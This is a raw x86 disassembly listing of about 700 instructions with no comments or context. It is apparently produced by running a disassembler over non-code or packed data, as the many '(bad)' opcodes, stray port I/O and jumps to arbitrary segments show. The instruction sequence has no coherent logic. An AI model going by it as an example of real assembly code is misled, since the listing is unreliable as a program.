  41d007:	mov    BYTE PTR [ecx-0x46],dh
  41d00a:	dec    ecx
  41d00b:	mov    edi,0x4418fbc9
  41d010:	(bad)  
  41d011:	std    
  41d012:	out    dx,al
  41d013:	repz and al,BYTE PTR [edx+ebp*4-0x6f3a7a2c]
  41d01b:	add    al,0xb2
  41d01d:	add    bl,bl
  41d01f:	fistp  WORD PTR [eax+ebx*4]
  41d022:	dec    edx
  41d023:	std    
  41d024:	popa   
  41d025:	adc    al,0x81
  41d027:	repz xor DWORD PTR cs:[eax+0x74],ebp
  41d02c:	repnz das 
  41d02e:	mov    cl,0x45
  41d030:	popa   
  41d031:	lods   eax,DWORD PTR ds:[esi]
  41d032:	js     0x41d077
  41d034:	pop    ebx
  41d035:	mov    edi,0x35a0e99b
  41d03a:	cld    
  41d03b:	jp     0x41cfe6
  41d03d:	push   cs
  41d03e:	or     esi,DWORD PTR [esi+eiz*8+0x5e7e9356]
  41d045:	mov    eax,DWORD PTR [edi+eax*4]
  41d048:	ret    0x5d5a
  41d04b:	push   ds
  41d04c:	cdq    
  41d04d:	xlat   BYTE PTR ds:[ebx]
  41d04e:	mov    bl,0xeb
  41d050:	pop    es
  41d051:	ret    0x10fe
  41d054:	pusha  
  41d055:	pushf  
  41d056:	ret    0x281c
  41d059:	daa    
  41d05a:	imul   ebp,DWORD PTR [ecx+0x75],0xe3eae425
  41d061:	fnsave [eax]
  41d063:	add    BYTE PTR [edi],ah
  41d065:	retf   
  41d066:	adc    al,0x6e
  41d068:	int    0xe0
  41d06a:	int    0x85
  41d06c:	inc    ecx
  41d06d:	push   ebx
  41d06e:	sub    edi,DWORD PTR [ebx-0x2f3e87ca]
  41d074:	fstp   DWORD PTR [eax]
  41d076:	pushf  
  41d077:	pusha  
  41d078:	div    BYTE PTR [ebp-0x496412eb]
  41d07e:	shl    al,0x9d
  41d081:	xacquire xchg DWORD PTR [edi+0x111a6944],ebx
  41d088:	jecxz  0x41d0ed
  41d08a:	sub    BYTE PTR [edi],al
  41d08c:	stos   BYTE PTR es:[edi],al
  41d08d:	outs   dx,DWORD PTR ds:[esi]
  41d08e:	(bad)  
  41d090:	cmp    ecx,DWORD PTR [ecx+edi*2]
  41d093:	adc    BYTE PTR [eax],dh
  41d095:	or     ah,dl
  41d097:	jg     0x41d027
  41d099:	add    ah,dl
  41d09b:	sti    
  41d09c:	inc    DWORD PTR ds:0x25fce6bc
  41d0a2:	pop    ss
  41d0a3:	mov    cl,0xa1
  41d0a5:	mov    ds:0x9b51ac65,al
  41d0aa:	bnd ret 
  41d0ac:	scas   al,BYTE PTR es:[edi]
  41d0ad:	xor    al,0x98
  41d0af:	dec    eax
  41d0b0:	daa    
  41d0b1:	xchg   esp,eax
  41d0b2:	inc    edi
  41d0b3:	jge    0x41d09b
  41d0b5:	push   edi
  41d0b6:	pop    ds
  41d0b7:	dec    edx
  41d0b8:	repnz stos BYTE PTR es:[edi],al
  41d0ba:	sub    BYTE PTR [eax-0xdf0573d],dl
  41d0c0:	scas   eax,DWORD PTR es:[edi]
  41d0c1:	pusha  
  41d0c2:	ins    DWORD PTR es:[edi],dx
  41d0c3:	xor    BYTE PTR [eax+0x73],dh
  41d0c6:	jmp    0x41d11a
  41d0c8:	jns    0x41d06a
  41d0ca:	mov    eax,0xd5500199
  41d0cf:	shr    DWORD PTR [edi],1
  41d0d1:	rol    BYTE PTR [edx-0x71],1
  41d0d4:	mov    al,BYTE PTR [esi]
  41d0d6:	popf   
  41d0d7:	adc    dh,dh
  41d0d9:	pushf  
  41d0da:	mov    ecx,DWORD PTR [ecx-0x67]
  41d0dd:	mov    eax,0x8bacaefd
  41d0e2:	ret    0xf41a
  41d0e5:	and    ebx,DWORD PTR [ecx+0x5]
  41d0e8:	cs jg  0x41d094
  41d0eb:	arpl   WORD PTR [esi-0x133024a6],bx
  41d0f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d0f2:	jmp    0x41d157
  41d0f4:	leave  
  41d0f5:	aam    0xee
  41d0f7:	lahf   
  41d0f8:	iret   
  41d0f9:	sbb    BYTE PTR [eax-0x3d1b475d],bl
  41d0ff:	outs   dx,BYTE PTR ds:[esi]
  41d100:	or     BYTE PTR [eax+ecx*2],cl
  41d103:	and    ch,cl
  41d105:	adc    ebp,edi
  41d107:	and    eax,DWORD PTR [esp+eiz*8-0x7f]
  41d10b:	xlat   BYTE PTR ds:[ebx]
  41d10c:	mov    WORD PTR [edx+0x7064728e],?
  41d112:	shl    ecx,1
  41d114:	jne    0x41d149
  41d116:	out    0x2e,al
  41d118:	fistp  DWORD PTR [eax-0x4f]
  41d11b:	jl     0x41d0c6
  41d11d:	loop   0x41d172
  41d11f:	jg     0x41d10f
  41d121:	aas    
  41d122:	ins    DWORD PTR es:[edi],dx
  41d123:	pushf  
  41d124:	jmp    0x41d0da
  41d126:	xlat   BYTE PTR ds:[ebx]
  41d127:	cmp    eax,DWORD PTR [ebp-0x338c6ca9]
  41d12d:	test   DWORD PTR [ebp+0x6f],ebx
  41d130:	into   
  41d131:	cmp    DWORD PTR [eax-0x447d6a81],edx
  41d137:	inc    esi
  41d138:	pop    ebx
  41d139:	or     eax,0x31049303
  41d13e:	sbb    al,0xb3
  41d140:	ja     0x41d16e
  41d142:	lock js 0x41d1ba
  41d145:	lahf   
  41d146:	(bad)  
  41d147:	ja     0x41d101
  41d149:	mov    ebp,0xb67c31f7
  41d14e:	jmp    0x41d11f
  41d150:	addr16 mov ecx,0xcf21918e
  41d156:	and    DWORD PTR [edx-0x4f74ced3],ebx
  41d15c:	mov    al,0xf6
  41d15e:	jbe    0x41d1b9
  41d160:	xor    eax,0x1fbf3faa
  41d165:	call   0x9de5:0xa14cfe6b
  41d16c:	jno    0x41d1cb
  41d16e:	dec    edx
  41d16f:	mov    al,ds:0x168381ea
  41d174:	shl    DWORD PTR [ebx-0x5cde847a],cl
  41d17a:	sbb    DWORD PTR ds:0x955943b,ebx
  41d180:	div    ecx
  41d182:	popa   
  41d183:	shl    dh,cl
  41d185:	pop    ds
  41d186:	jp     0x41d199
  41d188:	dec    edx
  41d189:	xrelease mov DWORD PTR ss:[esi+0x4],ebp
  41d18e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d18f:	in     al,0xf2
  41d191:	pusha  
  41d192:	out    dx,eax
  41d193:	pop    ebx
  41d194:	xor    al,0x2
  41d196:	mov    bl,0x85
  41d198:	push   0x12
  41d19a:	repnz mov ebx,0x454841d7
  41d1a0:	(bad)  
  41d1a1:	push   esp
  41d1a3:	sbb    esp,edx
  41d1a5:	mov    ebp,0x11471432
  41d1aa:	les    ecx,FWORD PTR [ebp+0x1a]
  41d1ad:	inc    eax
  41d1ae:	clc    
  41d1af:	mov    bl,0x71
  41d1b1:	cmp    al,0xf1
  41d1b3:	mov    al,0xcb
  41d1b5:	pop    ecx
  41d1b6:	lea    ebx,[edi-0xa9313f8]
  41d1bc:	xchg   esi,eax
  41d1bd:	popw   es
  41d1bf:	adc    edi,DWORD PTR cs:[ebx]
  41d1c2:	iret   
  41d1c3:	lds    ebx,FWORD PTR ss:[esi-0x2a680c81]
  41d1ca:	mov    ds:0x876ca8cc,eax
  41d1cf:	xor    eax,eax
  41d1d1:	ins    BYTE PTR es:[edi],dx
  41d1d2:	inc    esp
  41d1d3:	popf   
  41d1d4:	add    al,0xb4
  41d1d6:	xor    DWORD PTR [edi+ecx*8],ebp
  41d1d9:	test   bh,al
  41d1db:	sbb    al,0xf1
  41d1dd:	inc    esp
  41d1de:	mov    ah,bh
  41d1e0:	pop    ebp
  41d1e1:	lock push ebx
  41d1e3:	ss dec esi
  41d1e5:	cmp    BYTE PTR ds:0x5cf15f3a,cl
  41d1eb:	sbb    ah,bl
  41d1ed:	xor    DWORD PTR [esi-0x5b2f882a],ebx
  41d1f3:	lds    esp,FWORD PTR [edi+edx*8]
  41d1f6:	or     edi,ebx
  41d1f8:	jne    0x41d256
  41d1fa:	popf   
  41d1fb:	fs fucomp st(0)
  41d1fe:	outs   dx,BYTE PTR ds:[esi]
  41d1ff:	clc    
  41d200:	xor    dh,0xc4
  41d203:	retf   0x8718
  41d206:	sub    ch,BYTE PTR [ecx]
  41d208:	mov    bl,0x9f
  41d20a:	pop    ebx
  41d20b:	ror    BYTE PTR [ebx+edx*4-0x3d],0xa1
  41d210:	pop    edx
  41d211:	(bad)  
  41d212:	in     eax,dx
  41d213:	jle    0x41d232
  41d215:	inc    ebp
  41d216:	pop    edi
  41d217:	sar    DWORD PTR [ecx],0x45
  41d21a:	aaa    
  41d21b:	fcomp  DWORD PTR [edx]
  41d21d:	cs fcmovne st,st(5)
  41d220:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d221:	leave  
  41d222:	inc    edi
  41d223:	and    eax,0x7c67037
  41d228:	sub    DWORD PTR [esi-0x74],eax
  41d22b:	cld    
  41d22c:	or     edi,ecx
  41d22e:	outs   dx,BYTE PTR ds:[esi]
  41d22f:	sahf   
  41d230:	mov    al,0x24
  41d232:	sbb    eax,0xebe81b3a
  41d237:	aad    0xd3
  41d239:	or     ch,al
  41d23b:	mov    eax,ds:0xe2b185bd
  41d240:	aas    
  41d241:	sbb    al,0x80
  41d243:	mov    BYTE PTR [ebx+0x1ef8328e],al
  41d249:	aad    0x19
  41d24b:	push   0xffffff83
  41d24d:	inc    edi
  41d24e:	loope  0x41d2af
  41d250:	cdq    
  41d251:	sbb    esp,ebp
  41d253:	rcr    DWORD PTR [ecx+0x366c09b9],0x66
  41d25a:	sub    DWORD PTR [edx],0xffffffe4
  41d25d:	xor    DWORD PTR [edi+0x15],ebx
  41d260:	(bad)  
  41d262:	stc    
  41d263:	jg     0x41d2a3
  41d265:	out    dx,eax
  41d266:	iret   
  41d267:	sbb    DWORD PTR [ebp+0x34a9c518],0x37665019
  41d271:	in     al,dx
  41d272:	xchg   ebx,eax
  41d273:	mov    dh,0x67
  41d275:	sub    BYTE PTR [ebp-0x13],al
  41d278:	bound  ebp,QWORD PTR [edi-0xc]
  41d27b:	jns    0x41d2d8
  41d27d:	inc    ecx
  41d27e:	mov    al,ds:0x9c3f9bee
  41d283:	mov    eax,ds:0xdd3128d2
  41d288:	jo     0x41d211
  41d28a:	sbb    BYTE PTR [ebx*8+0x2a52ff],dh
  41d291:	sbb    esp,DWORD PTR gs:[ebx+edx*1-0x45]
  41d296:	retf   0xd1f7
  41d299:	mov    cs,ecx
  41d29b:	xchg   ecx,eax
  41d29c:	in     al,dx
  41d29d:	(bad)  
  41d29e:	lea    ecx,[ecx-0x54]
  41d2a1:	dec    eax
  41d2a2:	ror    DWORD PTR [esi],cl
  41d2a4:	push   ecx
  41d2a5:	das    
  41d2a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d2a7:	cwde   
  41d2a8:	int    0xce
  41d2aa:	ss pop esi
  41d2ac:	out    dx,al
  41d2ad:	div    DWORD PTR [ebp-0x18bcbcd2]
  41d2b3:	aas    
  41d2b4:	xchg   BYTE PTR ds:0x1420b8f7,ah
  41d2ba:	out    0xaf,eax
  41d2bc:	dec    edx
  41d2bd:	outs   dx,BYTE PTR ds:[esi]
  41d2be:	mov    edx,0x6071da25
  41d2c3:	pop    ebp
  41d2c4:	push   edx
  41d2c5:	fisttp QWORD PTR [ecx+edx*4]
  41d2c8:	push   edi
  41d2c9:	in     eax,0xdb
  41d2cb:	shl    BYTE PTR [esi+0x17],cl
  41d2ce:	mov    ecx,0xec5f4579
  41d2d3:	xchg   esp,eax
  41d2d4:	xor    DWORD PTR [eax],0xac41e23
  41d2da:	pop    ebx
  41d2db:	jno    0x41d298
  41d2dd:	rcl    BYTE PTR gs:[ebx+0x2960874b],1
  41d2e4:	sbb    eax,0xe60a24b9
  41d2e9:	mov    dl,0xe4
  41d2eb:	lds    esp,FWORD PTR [eax+edi*2+0xbb2fd4d]
  41d2f2:	lods   eax,DWORD PTR ds:[esi]
  41d2f3:	mov    ecx,0xa8e0b047
  41d2f8:	mov    esp,0x92592175
  41d2fd:	xchg   edx,eax
  41d2fe:	lods   eax,DWORD PTR ds:[esi]
  41d2ff:	ret    0xfcfc
  41d302:	xchg   ebp,eax
  41d303:	(bad)  
  41d304:	rcl    dh,cl
  41d306:	and    DWORD PTR [ebp-0x31b8be15],esi
  41d30c:	add    al,0xe0
  41d30e:	push   0x720a023f
  41d313:	mov    esp,0x36c4f89
  41d318:	rol    BYTE PTR [ecx+0x58],0x66
  41d31c:	js     0x41d34e
  41d31e:	jle    0x41d310
  41d320:	xchg   ecx,eax
  41d321:	and    ch,BYTE PTR [edi-0x37]
  41d324:	inc    esi
  41d325:	mov    cl,0x71
  41d327:	pop    eax
  41d328:	and    cl,BYTE PTR [ebx]
  41d32a:	sub    esp,DWORD PTR [esi+0x2c]
  41d32d:	mov    eax,DWORD PTR [edi-0x352e65b]
  41d333:	jge    0x41d3a7
  41d335:	add    dh,bl
  41d337:	mov    ds:0x16a25fc8,eax
  41d33c:	arpl   WORD PTR [ebx-0x3374c51f],sp
  41d342:	(bad)  
  41d345:	adc    eax,0xa14d0584
  41d34a:	imul   ebp,DWORD PTR [edi+0x13],0x41
  41d34e:	xchg   edi,eax
  41d34f:	aam    0xe9
  41d351:	lds    ecx,FWORD PTR [ebp+0x47]
  41d354:	cld    
  41d355:	outs   dx,DWORD PTR ds:[esi]
  41d356:	adc    ebx,esp
  41d358:	xlat   BYTE PTR ds:[ebx]
  41d359:	js     0x41d3bb
  41d35b:	jno    0x41d384
  41d35d:	and    DWORD PTR [esi+0x4cbd87c9],edx
  41d363:	mov    WORD PTR [edi],gs
  41d365:	mov    ?,WORD PTR [ebx-0x78]
  41d368:	test   BYTE PTR [esi],ch
  41d36a:	sbb    BYTE PTR cs:[esi+0x6d],ah
  41d36e:	inc    edi
  41d36f:	or     al,BYTE PTR [eax]
  41d371:	test   al,0xb6
  41d373:	loope  0x41d32c
  41d375:	sbb    dl,dh
  41d377:	sbb    ch,BYTE PTR [esi+0x1e901b69]
  41d37d:	or     BYTE PTR [ecx-0x7cdd1af6],dl
  41d383:	rcl    ch,cl
  41d385:	pop    eax
  41d386:	xor    eax,0xaa213215
  41d38b:	push   edi
  41d38c:	adc    ebp,DWORD PTR fs:[ebx]
  41d38f:	fdiv   QWORD PTR ds:0xae5cbe67
  41d395:	push   cs
  41d396:	or     esp,ebp
  41d398:	xchg   ebp,eax
  41d399:	out    dx,al
  41d39a:	scas   al,BYTE PTR es:[edi]
  41d39b:	jp     0x41d41b
  41d39d:	outs   dx,DWORD PTR ds:[esi]
  41d39e:	jbe    0x41d399
  41d3a0:	hlt    
  41d3a1:	arpl   WORD PTR [eax+0x476f58fb],si
  41d3a7:	jbe    0x41d387
  41d3a9:	push   es
  41d3aa:	(bad)  
  41d3ab:	mov    ds:0x58b0c7a0,al
  41d3b0:	add    BYTE PTR [esi],al
  41d3b2:	push   cs
  41d3b3:	mov    eax,ds:0x5bf33a75
  41d3b8:	div    BYTE PTR [ecx+0x6d]
  41d3bb:	push   es
  41d3bc:	retf   0x1f4c
  41d3bf:	jmp    0x41d394
  41d3c1:	psubusb mm0,QWORD PTR [ebp+0x61b327fc]
  41d3c8:	inc    edx
  41d3c9:	out    dx,al
  41d3ca:	adc    eax,0x3b1b41d1
  41d3cf:	repnz es retf 
  41d3d2:	loopne 0x41d3f6
  41d3d4:	out    0x87,al
  41d3d6:	pop    edi
  41d3d7:	dec    ecx
  41d3d8:	jg     0x41d3e6
  41d3da:	push   0xa0cc0238
  41d3df:	clc    
  41d3e0:	out    dx,al
  41d3e1:	cmp    eax,0x297e633b
  41d3e6:	mov    ds:0x14909930,eax
  41d3eb:	sbb    ebp,DWORD PTR [eax-0x49]
  41d3ee:	loopne 0x41d3ac
  41d3f0:	add    DWORD PTR [edx],0xb2b0185f
  41d3f6:	ret    0xceea
  41d3f9:	test   DWORD PTR [edi+0x73a4ee30],ecx
  41d3ff:	or     eax,0x6b103649
  41d404:	xchg   esi,eax
  41d405:	int    0x8b
  41d407:	pop    esp
  41d408:	jmp    0x41d3b0
  41d40a:	daa    
  41d40b:	or     ecx,DWORD PTR [eax-0x54c7f3dc]
  41d411:	pop    esp
  41d412:	add    al,0x8f
  41d414:	mov    esi,0x5a2d672c
  41d419:	ins    BYTE PTR es:[edi],dx
  41d41a:	nop
  41d41b:	push   eax
  41d41c:	lahf   
  41d41d:	push   ss
  41d41e:	addr16 push eax
  41d420:	cs test ah,ch
  41d423:	mov    ecx,0x8c9d2646
  41d428:	mov    esp,ecx
  41d42a:	dec    ebx
  41d42b:	sbb    eax,DWORD PTR [ebp-0x14]
  41d42e:	jg     0x41d412
  41d430:	mov    ebx,0xa401c86a
  41d435:	outs   dx,BYTE PTR ds:[esi]
  41d436:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d437:	imul   edi,DWORD PTR ds:0xe16ac412,0x8d6d71ef
  41d441:	pop    es
  41d442:	adc    al,0x3f
  41d444:	xor    DWORD PTR [esi],edx
  41d446:	(bad)  
  41d447:	out    0x86,al
  41d449:	mov    ds:0x90a813af,eax
  41d44e:	imul   edi,edi,0x579991f8
  41d454:	or     edx,ebx
  41d456:	and    ecx,DWORD PTR [eax+0x4f]
  41d459:	jle    0x41d3ee
  41d45b:	cmc    
  41d45c:	pop    ebp
  41d45d:	ror    BYTE PTR [ecx+0x78],cl
  41d460:	add    DWORD PTR [ebx],edi
  41d462:	and    dh,BYTE PTR [ebp-0x6be260a8]
  41d468:	sub    eax,0xb564437f
  41d46d:	adc    BYTE PTR [ebp+0x753fc62f],0xea
  41d474:	mov    eax,ds:0x4d94d48c
  41d479:	cmp    dh,BYTE PTR [ecx-0x53]
  41d47c:	jle    0x41d49d
  41d47e:	mov    al,ds:0x9bd7080e
  41d483:	xor    eax,0xc39c3db0
  41d488:	test   DWORD PTR [ecx-0xe],edx
  41d48b:	sub    eax,0xa52056bf
  41d491:	test   BYTE PTR [eax],bh
  41d493:	xor    BYTE PTR [ebp+eax*4+0x2ef9f168],bh
  41d49a:	in     eax,dx
  41d49b:	mov    eax,0xb4439db2
  41d4a0:	ds push esi
  41d4a2:	sbb    eax,0xbe1ca72a
  41d4a7:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  41d4a9:	add    esi,DWORD PTR [ebx]
  41d4ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d4ac:	fdivr  QWORD PTR [ecx+0x46e982b7]
  41d4b2:	jne    0x41d529
  41d4b4:	and    eax,0x7af1aa43
  41d4b9:	jns    0x41d445
  41d4bb:	push   0x2f11e2a6
  41d4c0:	(bad)  [edx+0x502126f5]
  41d4c6:	or     ebp,DWORD PTR [edi]
  41d4c8:	ins    BYTE PTR es:[edi],dx
  41d4c9:	xor    edx,DWORD PTR [eax]
  41d4cb:	inc    ecx
  41d4cc:	lahf   
  41d4cd:	sbb    eax,0xca25a679
  41d4d2:	div    BYTE PTR [ebx]
  41d4d4:	or     esi,edi
  41d4d6:	ins    BYTE PTR es:[edi],dx
  41d4d7:	call   0x11e3:0x5a297cbf
  41d4de:	jge    0x41d50f
  41d4e0:	or     edx,DWORD PTR [esi-0x1b]
  41d4e3:	es in  eax,0x6d
  41d4e6:	inc    esi
  41d4e7:	pop    esi
  41d4e8:	xchg   edi,eax
  41d4e9:	mov    bh,BYTE PTR [edi+ecx*8]
  41d4ec:	mov    esi,0x782af2e4
  41d4f1:	iret   
  41d4f2:	pop    ds
  41d4f3:	adc    al,0xe
  41d4f5:	cmp    edx,DWORD PTR [edi-0x13b07ea5]
  41d4fb:	sahf   
  41d4fc:	pop    edi
  41d4fd:	and    eax,0x962ae0c6
  41d502:	jle    0x41d4e5
  41d504:	inc    ebp
  41d505:	push   edi
  41d506:	mov    bl,0xe
  41d508:	lahf   
  41d509:	sbb    BYTE PTR [edx-0x5c],0x8f
  41d50d:	imul   esi,DWORD PTR [esi+0x31213063],0xa959cb56
  41d517:	jl     0x41d526
  41d519:	push   edx
  41d51a:	or     ch,BYTE PTR [ecx-0x1934856]
  41d520:	dec    ecx
  41d521:	in     al,dx
  41d522:	out    dx,al
  41d523:	bound  esp,QWORD PTR [ebx+0x59]
  41d526:	outs   dx,BYTE PTR ds:[esi]
  41d527:	sub    edi,DWORD PTR [edx]
  41d529:	xor    BYTE PTR [ecx-0x16],dl
  41d52c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d52d:	sahf   
  41d52e:	dec    edi
  41d52f:	push   ds
  41d530:	sub    al,0x4e
  41d532:	pop    esp
  41d533:	mov    eax,ds:0x4d5bd9b8
  41d538:	mov    ds:0x404c8bd5,al
  41d53e:	int3   
  41d53f:	js     0x41d56a
  41d541:	sbb    eax,0x26c672cf
  41d546:	mov    esp,0x4ddf5936
  41d54b:	fist   DWORD PTR [ecx]
  41d54d:	mov    ds:0x837e29f3,eax
  41d552:	jns    0x41d55d
  41d554:	(bad)  
  41d555:	pop    ecx
  41d556:	push   cs
  41d557:	xor    BYTE PTR [esi],al
  41d559:	mov    gs,edx
  41d55b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d55c:	sub    ebx,0x4e
  41d55f:	xor    al,0xc5
  41d561:	aaa    
  41d562:	dec    edx
  41d563:	lds    ecx,FWORD PTR [edi]
  41d565:	cdq    
  41d566:	sbb    BYTE PTR [edx],bl
  41d568:	jne    0x41d4ed
  41d56a:	stos   BYTE PTR es:[edi],al
  41d56b:	or     BYTE PTR [ecx],0x94
  41d56e:	mov    al,0xf
  41d570:	pop    esi
  41d571:	jmp    0x35b2:0xbf5e1598
  41d578:	and    ch,BYTE PTR [edi+0x78]
  41d57b:	mov    eax,0x4d0d6a73
  41d580:	and    DWORD PTR [esi-0x43999db2],edi
  41d586:	adc    esp,ebx
  41d588:	jl     0x41d563
  41d58a:	idiv   bh
  41d58c:	inc    esp
  41d58d:	cmp    DWORD PTR [edx],0x40766103
  41d593:	shr    DWORD PTR [edx+0x25cd653d],cl
  41d599:	mov    bl,BYTE PTR [ecx+edi*1+0x3686883f]
  41d5a0:	inc    edi
  41d5a1:	dec    edi
  41d5a2:	jg     0x41d5c9
  41d5a4:	outs   dx,DWORD PTR ds:[esi]
  41d5a5:	in     eax,dx
  41d5a6:	push   eax
  41d5a7:	xor    ch,bh
  41d5a9:	pushf  
  41d5aa:	int    0xb7
  41d5ac:	jl     0x41d612
  41d5ae:	clc    
  41d5af:	mov    WORD PTR [eax],?
  41d5b1:	adc    BYTE PTR [ecx+0xc1f62e9],dl
  41d5b7:	dec    eax
  41d5b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d5b9:	(bad)  [eax+0x1c]
  41d5bc:	dec    ebp
  41d5bd:	out    0x4a,al
  41d5bf:	push   ss
  41d5c0:	in     al,dx
  41d5c1:	sahf   
  41d5c2:	mov    ah,0xd2
  41d5c4:	mov    DWORD PTR [esi-0x626e7a0b],ebp
  41d5ca:	fwait
  41d5cb:	jbe    0x41d5ef
  41d5cd:	ins    DWORD PTR es:[edi],dx
  41d5ce:	or     esi,ecx
  41d5d0:	adc    ebx,DWORD PTR [eax]
  41d5d2:	into   
  41d5d3:	rol    DWORD PTR [edx],1
  41d5d5:	and    ebp,DWORD PTR [edx+0x9cdaabd]
  41d5db:	mov    edx,0x76edfd30
  41d5e0:	or     eax,DWORD PTR [edx-0xd]
  41d5e3:	repnz pop ss
  41d5e5:	outs   dx,DWORD PTR ds:[esi]
  41d5e6:	and    al,0x5d
  41d5e8:	mov    bh,0xda
  41d5ea:	xor    al,0x24
  41d5ec:	or     DWORD PTR [eax+0x73d84b54],esp
  41d5f2:	xor    eax,0x2fe6687f
  41d5f7:	push   es
  41d5f8:	and    BYTE PTR [edi+ebp*4],ch
  41d5fb:	sbb    eax,0xa2cdf3ac
  41d600:	xor    edi,DWORD PTR [eax-0x73]
  41d603:	inc    esp
  41d604:	retf   
  41d605:	and    al,0x49
  41d607:	enter  0x63a0,0x5f
  41d60b:	adc    al,0xda
  41d60d:	and    al,0x4f
  41d60f:	xchg   ebx,eax
  41d610:	xchg   DWORD PTR [ecx+0x6e0f1469],edi
  41d616:	or     al,0xab
  41d618:	inc    ebp
  41d619:	enter  0xc4de,0x17
  41d61d:	xor    ebx,DWORD PTR [edx+0x6e]
  41d620:	adc    bl,BYTE PTR [ecx+0x649213fb]
  41d626:	push   ebx
  41d627:	cdq    
  41d628:	push   ecx
  41d629:	xor    al,BYTE PTR [ebx-0x3fccc10a]
  41d62f:	pop    es
  41d630:	fist   DWORD PTR [edx]
  41d632:	fcmove st,st(1)
  41d634:	retf   0x4b41
  41d637:	cmp    ch,BYTE PTR [edi]
  41d639:	stc    
  41d63a:	dec    edx
  41d63b:	xchg   ecx,eax
  41d63c:	aaa    
  41d63d:	clc    
  41d63e:	stc    
  41d63f:	(bad)  
  41d640:	stos   BYTE PTR es:[edi],al
  41d641:	clc    
  41d642:	cwde   
  41d643:	cmp    BYTE PTR [edx-0x1384a3c9],dh
  41d649:	int    0xed
  41d64b:	sub    eax,0x569b008b
  41d650:	cwde   
  41d651:	dec    ecx
  41d652:	push   esp
  41d653:	rcl    BYTE PTR [edx],cl
  41d655:	sahf   
  41d656:	mov    ecx,0xe3e1abd6
  41d65b:	pop    eax
  41d65c:	shr    ch,0x56
  41d65f:	jmp    0xa6b6c825
  41d664:	sub    eax,0x188b4672
  41d669:	and    ebp,edx
  41d66b:	imul   edi,DWORD PTR [ebx],0xf6343bc1
  41d671:	push   ebp
  41d672:	push   esi
  41d673:	stos   DWORD PTR es:[edi],eax
  41d674:	imul   esp,DWORD PTR [edx+0x6c],0x60
  41d678:	jae    0x41d6b0
  41d67a:	pop    ds
  41d67b:	push   ebp
  41d67c:	mov    WORD PTR [edx-0x167f426e],es
  41d682:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d683:	dec    edi
  41d684:	jg     0x41d60d
  41d686:	and    eax,0xebc3ce72
  41d68b:	push   edi
  41d68c:	scas   eax,DWORD PTR es:[edi]
  41d68d:	jne    0x41d631
  41d68f:	leave  
  41d690:	push   es
  41d691:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d692:	es ret 
  41d694:	int3   
  41d695:	not    ah
  41d697:	mov    ds:0xafccc47,eax
  41d69c:	push   eax
  41d69d:	sbb    BYTE PTR [ebx],0xaf
  41d6a0:	jmp    0xeb1e0b92
  41d6a5:	mov    esi,0x2ff9b94b
  41d6aa:	call   0x63c9c26c
  41d6af:	and    dh,0x5a
  41d6b2:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d6b4:	xchg   BYTE PTR [ebx],al
  41d6b6:	les    edi,FWORD PTR [ebx+eax*1+0x5b177e51]
  41d6bd:	mov    cl,0x3a
  41d6bf:	push   ebp
  41d6c0:	cmp    edi,DWORD PTR [edx]
  41d6c2:	mov    ecx,0xa94d6cdb
  41d6c7:	add    bl,BYTE PTR [edx-0x72beb4e8]
  41d6cd:	pop    ecx
  41d6ce:	push   edi
  41d6cf:	ret    0x8f49
  41d6d2:	or     ah,BYTE PTR [ecx+0x3f274aa6]
  41d6d8:	bound  edi,QWORD PTR [edi-0x1b]
  41d6db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d6dc:	push   ebx
  41d6dd:	into   
  41d6de:	div    BYTE PTR [eax]
  41d6e0:	fldcw  WORD PTR [eax+0x69]
  41d6e3:	cmp    al,0x3d
  41d6e5:	mov    dh,0xb0
  41d6e7:	loop   0x41d75d
  41d6e9:	xchg   ecx,eax
  41d6ea:	xchg   esp,eax
  41d6eb:	(bad)  
  41d6ec:	mov    bh,0x3b
  41d6ee:	into   
  41d6ef:	pop    edi
  41d6f0:	or     DWORD PTR [ecx],ecx
  41d6f2:	add    eax,0x22d021e0
  41d6f7:	outs   dx,DWORD PTR ds:[esi]
  41d6f8:	cdq    
  41d6f9:	or     eax,0x3f792860
  41d6fe:	sub    al,BYTE PTR [ecx-0x10]
  41d701:	lods   al,BYTE PTR ds:[esi]
  41d702:	cmp    edi,DWORD PTR [eax+0x67b8a32b]
  41d708:	stos   DWORD PTR es:[edi],eax
  41d709:	(bad)  
  41d70a:	pusha  
  41d70b:	mov    al,ds:0x963c65d0
  41d710:	cmp    eax,0x661c77cb
  41d715:	jne    0x41d722
  41d717:	mov    al,ds:0x9623bcf3
  41d71c:	sbb    al,0xa9
  41d71e:	jae    0x41d6f1
  41d720:	jmp    0x80e41a05
  41d725:	push   0x3486aff7
  41d72a:	fnstcw WORD PTR [edi-0x1226f96a]
  41d730:	in     al,0x80
  41d732:	mov    ebp,0xd5929df1
  41d737:	adc    DWORD PTR [ecx-0x57],edx
  41d73a:	pop    esp
  41d73b:	sub    al,0xa9
  41d73d:	sub    eax,0x4c216549
  41d742:	mov    ah,0x89
  41d744:	mov    ebp,0x4d8a3bb7
  41d749:	xchg   ebx,eax
  41d74a:	iret   
  41d74b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d74c:	(bad)  
  41d74d:	adc    dl,BYTE PTR [ebx-0x30f7ddfb]
  41d753:	xchg   DWORD PTR [esi-0x28f3d10d],edx
  41d759:	pop    ebx
  41d75a:	xchg   edi,eax
  41d75b:	or     eax,0x439f2b68
  41d760:	jmp    0x8742:0xea8d4d60
  41d767:	into   
  41d768:	push   edx
  41d769:	in     al,0x49
  41d76b:	add    esp,esi
  41d76d:	mov    BYTE PTR [ecx],ah
  41d76f:	push   ss
  41d770:	jmp    FWORD PTR [eax-0x70]
  41d773:	cdq    
  41d774:	in     eax,dx
  41d775:	imul   BYTE PTR [ebx-0x73ce13ba]
  41d77b:	retf   0x8572
  41d77e:	int3   
